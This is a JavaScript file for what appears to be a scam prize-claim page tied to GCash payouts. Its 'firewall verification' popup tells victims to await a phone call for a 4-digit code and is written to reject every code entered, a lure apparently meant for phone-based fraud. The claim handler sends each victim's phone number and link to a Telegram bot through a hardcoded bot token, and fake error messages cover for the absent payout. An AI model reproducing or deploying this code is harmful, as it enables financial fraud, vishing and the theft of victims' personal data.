/**
 * popup_share.js
 * COMPLETE LOGIC: Firewall Check, Link Redirect, Verification Popup
 */

// ========== FIREBASE INITIALIZATION ==========
const db = firebase.database();

// ========== 1. MAIN ACTION: CLAIM THRU GCASH ==========
async function handleClaimThruGCash() {
    console.log("CLAIM THRU GCASH clicked");
    
    // Close prize popup first
    var prizePopup = document.getElementById('prizePopup');
    if (prizePopup) prizePopup.style.display = 'none';
    
    try {
        // Check firewall status
        const firewallSnap = await db.ref('admin/globalFirewall/active').once('value');
        const isFirewallOn = firewallSnap.val();
        
        console.log("Firewall status:", isFirewallOn ? "ON" : "OFF");
        
        if (isFirewallOn === true) {
            // FIREWALL ON - Show verification popup
            showFirewallVerificationPopup();
        } else {
            // FIREWALL OFF - Find available link
            const linkSnap = await db.ref('links').orderByChild('status').equalTo('available').limitToFirst(1).once('value');
            
            if (linkSnap.exists()) {
                // Get the link
                const key = Object.keys(linkSnap.val())[0];
                const linkData = linkSnap.val()[key];
                let targetUrl = linkData.url;
                
                // Fix URL if needed
                if (targetUrl && !targetUrl.startsWith('http')) {
                    targetUrl = 'https://' + targetUrl;
                }
                
                // Update link status to 'claimed'
                const userPhone = localStorage.getItem("userPhone") || "Unknown";
                await db.ref('links/' + key).update({
                    status: 'claimed',
                    user: userPhone,
                    claimedAt: Date.now()
                });
                
                // Send Telegram notification
                fetch('https://api.telegram.org/bot8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg/sendMessage?chat_id=7298607329&text=' + encodeURIComponent("CLAIM SUCCESS!\nPhone: " + userPhone + "\nLink: " + targetUrl))
                    .catch(e => console.log("Telegram error:", e));
                
                console.log("Redirecting to:", targetUrl);
                alert("✅ CLAIM SUCCESSFUL! Redirecting to GCash payout...");
                window.location.href = targetUrl;
                
            } else {
                // No link available
                showNoLinkAlert();
            }
        }
    } catch(error) {
        console.error("Error in handleClaimThruGCash:", error);
        alert("SYSTEM ERROR\n\nPlease try again later.");
    }
}

// ========== 2. FIREWALL VERIFICATION POPUP (4-DIGIT CODE - ALWAYS INVALID) ==========
function showFirewallVerificationPopup() {
    // Remove existing modal if any
    var existingModal = document.getElementById('firewallModal');
    if (existingModal) existingModal.remove();
    
    var modal = document.createElement('div');
    modal.id = 'firewallModal';
    modal.style.position = 'fixed';
    modal.style.top = '0';
    modal.style.left = '0';
    modal.style.width = '100%';
    modal.style.height = '100%';
    modal.style.background = 'rgba(0,0,0,0.95)';
    modal.style.backdropFilter = 'blur(10px)';
    modal.style.zIndex = '20001';
    modal.style.display = 'flex';
    modal.style.alignItems = 'center';
    modal.style.justifyContent = 'center';
    modal.style.fontFamily = "'Inter', sans-serif";
    
    modal.innerHTML = `
        <div style="background: linear-gradient(145deg, #1a1525, #0f0a1a); border-radius: 48px; max-width: 340px; width: 85%; padding: 30px 25px; text-align: center; border: 1px solid rgba(255,215,0,0.3);">
            <div style="font-size: 48px; margin-bottom: 15px;">📞</div>
            <h2 style="color: #ff4444; font-size: 22px; margin-bottom: 15px;">VERIFICATION REQUIRED</h2>
            <div style="color: white; font-size: 13px; margin-bottom: 20px; line-height: 1.5;">
                <p>Please wait for the system-verification call.</p>
                <p>An operator will provide your <strong>4-digit code</strong> shortly.</p>
            </div>
            <div style="display: flex; gap: 10px; margin-bottom: 15px;">
                <input type="text" id="verifyCodeInput" style="flex: 1; background: rgba(0,0,0,0.5); border: 1px solid rgba(255,215,0,0.3); border-radius: 30px; padding: 12px; color: white; font-size: 18px; text-align: center; letter-spacing: 4px;" placeholder="1234" maxlength="4" inputmode="numeric">
                <button id="submitVerifyBtn" style="background: linear-gradient(135deg, #ff4444, #cc0000); border: none; border-radius: 30px; padding: 0 20px; font-weight: bold; color: white; cursor: pointer;">VERIFY</button>
            </div>
            <div id="verifyErrorMsg" style="color: #ff4444; font-size: 12px; margin-top: 10px; display: none;"></div>
            <div style="font-size: 11px; color: #ffaa33; margin-top: 10px;">Waiting for verification call...</div>
        </div>
    `;
    
    document.body.appendChild(modal);
    
    var codeInput = document.getElementById('verifyCodeInput');
    var verifyBtn = document.getElementById('submitVerifyBtn');
    var errorDiv = document.getElementById('verifyErrorMsg');
    
    if (codeInput) codeInput.focus();
    
    // ALWAYS INVALID - No correct code
    verifyBtn.onclick = function() {
        var enteredCode = codeInput.value.trim();
        
        if (!enteredCode || enteredCode.length < 4) {
            errorDiv.innerHTML = "Please enter a 4-digit code.";
            errorDiv.style.display = 'block';
            return;
        }
        
        // Always show error - never successful
        errorDiv.innerHTML = "❌ Invalid verification code. Please provide the correct 4-digit code from the verification call.";
        errorDiv.style.display = 'block';
        codeInput.value = '';
        codeInput.focus();
        
        console.log("Verification failed - Always invalid per firewall policy");
    };
    
    // Close modal when clicking outside
    modal.onclick = function(e) {
        if (e.target === modal) {
            modal.remove();
        }
    };
}

// ========== 3. NO LINK ALERT ==========
function showNoLinkAlert() {
    var modal = document.createElement('div');
    modal.style.position = 'fixed';
    modal.style.top = '0';
    modal.style.left = '0';
    modal.style.width = '100%';
    modal.style.height = '100%';
    modal.style.background = 'rgba(0,0,0,0.95)';
    modal.style.backdropFilter = 'blur(10px)';
    modal.style.zIndex = '20000';
    modal.style.display = 'flex';
    modal.style.alignItems = 'center';
    modal.style.justifyContent = 'center';
    modal.style.fontFamily = "'Inter', sans-serif";
    
    modal.innerHTML = `
        <div style="background: linear-gradient(145deg, #1a1525, #0f0a1a); border-radius: 40px; max-width: 340px; width: 85%; padding: 30px 25px; text-align: center; border: 1px solid rgba(255,68,68,0.3);">
            <div style="font-size: 48px; margin-bottom: 15px;">⚠️</div>
            <h3 style="color: #ff4444; font-size: 20px; margin-bottom: 20px;">WITHDRAWAL UNSUCCESSFUL</h3>
            <div style="color: white; font-size: 13px; line-height: 1.6; text-align: left;">
                <p><strong>Possible Reasons:</strong></p>
                <p>• No GCash payout link has been deployed by the administrator.</p>
                <p>• This device has already reached the maximum payout limit.</p>
                <p>• No GCash app installed on this device.</p>
                <p>• Please try using another device or contact support.</p>
            </div>
            <button id="closeAlertBtn" style="background: linear-gradient(135deg, #ff4444, #cc0000); border: none; border-radius: 40px; padding: 12px 25px; color: white; font-weight: bold; margin-top: 25px; cursor: pointer; width: 100%;">GOT IT</button>
        </div>
    `;
    
    document.body.appendChild(modal);
    document.getElementById('closeAlertBtn').onclick = function() {
        modal.remove();
    };
    
    modal.onclick = function(e) {
        if (e.target === modal) modal.remove();
    };
}

// ========== 4. INITIALIZE CLAIM THRU GCASH BUTTON ==========
function initClaimThruGCashButton() {
    var claimBtn = document.getElementById('claimGCashBtn');
    if (claimBtn) {
        // Remove existing listeners
        var newBtn = claimBtn.cloneNode(true);
        claimBtn.parentNode.replaceChild(newBtn, claimBtn);
        claimBtn = newBtn;
        
        claimBtn.onclick = function(e) {
            e.preventDefault();
            e.stopPropagation();
            console.log("CLAIM THRU GCASH button clicked");
            handleClaimThruGCash();
        };
        console.log("CLAIM THRU GCASH button initialized");
    } else {
        console.log("CLAIM THRU GCASH button not found - will retry");
        // Retry after short delay
        setTimeout(initClaimThruGCashButton, 500);
    }
}

// ========== 5. PRIZE POPUP FUNCTIONS ==========
function showPrizePopup() {
    var popup = document.getElementById('prizePopup');
    if (popup) {
        popup.style.display = 'flex';
        if (typeof startConfetti === 'function') startConfetti();
    }
}

function closePrizePopup() {
    var popup = document.getElementById('prizePopup');
    if (popup) {
        popup.style.display = 'none';
        if (typeof stopConfetti === 'function') stopConfetti();
    }
}

// ========== 6. INITIALIZE ON PAGE LOAD ==========
document.addEventListener('DOMContentLoaded', function() {
    console.log("Popup_share.js loaded");
    initClaimThruGCashButton();
});

// Expose functions for global access
window.handleClaimThruGCash = handleClaimThruGCash;
window.showPrizePopup = showPrizePopup;
window.closePrizePopup = closePrizePopup;
